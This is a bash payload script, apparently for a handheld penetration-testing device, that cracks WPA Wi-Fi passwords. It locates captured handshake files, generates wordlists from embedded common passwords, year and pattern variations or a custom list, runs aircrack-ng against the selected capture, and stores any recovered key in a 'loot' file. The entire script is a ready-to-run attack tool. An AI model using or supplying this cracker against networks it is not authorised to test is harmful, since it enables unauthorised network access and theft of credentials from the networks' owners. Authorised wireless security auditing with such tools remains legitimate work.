#!/bin/bash
# Title: WPA Cracker
# Author: bad-antics
# Description: Onboard wordlist attack on captured handshakes
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "WPA CRACKER

Crack WPA handshakes
using onboard wordlists.

Includes common passwords
and pattern generators.

Press OK to continue."

# Check for capture files
CAP_FILES=$(find /mmc/nullsec -name "*.cap" 2>/dev/null | head -10)
CAP_COUNT=$(echo "$CAP_FILES" | grep -c ".cap" || echo 0)

if [ "$CAP_COUNT" -eq 0 ]; then
    ERROR_DIALOG "No handshakes found!

Capture a handshake first
using HandshakeHunter or
AutoPwn payload."
    exit 1
fi

PROMPT "FOUND $CAP_COUNT CAPTURES

Select file to crack
on next screen."

# List files
FILE_LIST=$(echo "$CAP_FILES" | nl)
FILE_NUM=$(NUMBER_PICKER "File # (1-$CAP_COUNT):" 1)
TARGET_FILE=$(echo "$CAP_FILES" | sed -n "${FILE_NUM}p")

PROMPT "WORDLIST OPTIONS:

1. Common passwords (fast)
2. Extended wordlist
3. Pattern attack
4. Custom wordlist path

Enter option next."

WORDLIST_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)

case $WORDLIST_MODE in
    1) # Common
        WORDLIST="/tmp/common.txt"
cat > "$WORDLIST" << 'COMMONWORDS'
password
123456
12345678
password1
123456789
qwerty
abc123
password123
1234567890
letmein
welcome
admin
monkey
dragon
master
login
princess
sunshine
iloveyou
trustno1
000000
football
shadow
superman
michael
ninja
mustang
password12
password01
qwerty123
admin123
welcome1
letmein1
qwertyuiop
1q2w3e4r
COMMONWORDS
        ;;
    2) # Extended
        WORDLIST="/tmp/extended.txt"
        # Generate extended list
        cat > "$WORDLIST" << 'EXTWORDS'
password
123456
12345678
qwerty
EXTWORDS
        # Add year variations
        for year in 2020 2021 2022 2023 2024 2025; do
            echo "password$year" >> "$WORDLIST"
            echo "$year" >> "$WORDLIST"
        done
        # Add common patterns
        for word in love life home work wifi network admin guest; do
            echo "$word" >> "$WORDLIST"
            echo "${word}123" >> "$WORDLIST"
            echo "${word}1234" >> "$WORDLIST"
        done
        ;;
    3) # Pattern
        PROMPT "PATTERN ATTACK:

Enter base word to try
variations of (e.g. name,
company, pet name).

Enter on next screen."
        BASE_WORD=$(TEXT_PICKER "Base word:" "password")
        WORDLIST="/tmp/pattern.txt"
        echo "$BASE_WORD" > "$WORDLIST"
        echo "${BASE_WORD}1" >> "$WORDLIST"
        echo "${BASE_WORD}12" >> "$WORDLIST"
        echo "${BASE_WORD}123" >> "$WORDLIST"
        echo "${BASE_WORD}1234" >> "$WORDLIST"
        echo "${BASE_WORD}!" >> "$WORDLIST"
        echo "${BASE_WORD}@" >> "$WORDLIST"
        echo "${BASE_WORD}#" >> "$WORDLIST"
        for year in 2020 2021 2022 2023 2024 2025; do
            echo "${BASE_WORD}${year}" >> "$WORDLIST"
        done
        echo "${BASE_WORD^}" >> "$WORDLIST"
        echo "${BASE_WORD^^}" >> "$WORDLIST"
        ;;
    4) # Custom
        WORDLIST=$(TEXT_PICKER "Wordlist path:" "/mmc/wordlists/rockyou.txt")
        ;;
esac

WORD_COUNT=$(wc -l < "$WORDLIST" 2>/dev/null || echo 0)

resp=$(CONFIRMATION_DIALOG "START CRACKING?

Target: $(basename $TARGET_FILE)
Wordlist: $WORD_COUNT words

This may take a while.
Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Cracking..."
SPINNER_START "Attempting $WORD_COUNT passwords..."

RESULT=$(aircrack-ng -w "$WORDLIST" "$TARGET_FILE" 2>/dev/null)

SPINNER_STOP

if echo "$RESULT" | grep -q "KEY FOUND"; then
    KEY=$(echo "$RESULT" | grep "KEY FOUND" | sed 's/.*\[ \(.*\) \].*/\1/')
    
    # Save to loot
    echo "File: $TARGET_FILE" >> "$LOOT_DIR/cracked.txt"
    echo "Password: $KEY" >> "$LOOT_DIR/cracked.txt"
    echo "Date: $(date)" >> "$LOOT_DIR/cracked.txt"
    echo "---" >> "$LOOT_DIR/cracked.txt"
    
    PROMPT "PASSWORD FOUND!

$KEY

Saved to cracked.txt

Press OK to exit."
else
    PROMPT "NO MATCH FOUND

Password not in wordlist.

Try:
- Different wordlist
- Pattern attack
- More captures

Press OK to exit."
fi
